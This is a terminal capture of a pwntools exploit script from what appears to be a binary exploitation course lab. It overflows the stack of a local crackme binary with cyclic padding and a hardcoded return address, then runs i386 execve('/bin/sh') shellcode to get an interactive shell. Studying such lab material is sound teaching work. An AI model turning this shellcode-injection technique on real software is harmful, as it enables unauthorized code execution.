vagrant@ubuntu-bionic:~/tuts/lab03/tut03-pwntool$ cat exploit4.py
#!/usr/bin/env python2

from pwn import *

context.update(arch='i386', os='linux')

shellcode = """
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    /* push SYS_execve 0xb */
    push 0x30
    pop eax
    xor eax,0x3b
    int 0x80
"""

payload  = cyclic(cyclic_find(0x61616167))
payload += p32(0xffffd580)
#payload += p32(0xdeadbeef)
payload += asm(shellcode)
print(hexdump(asm(shellcode)))
print(asm(shellcode))
p = process("./crackme0x00")
#p = gdb.debug("./crackme0x00", '''
#echo "hi"
## break *0xdeadbeef
#continue
#''')
p.sendline(payload)
p.interactive()
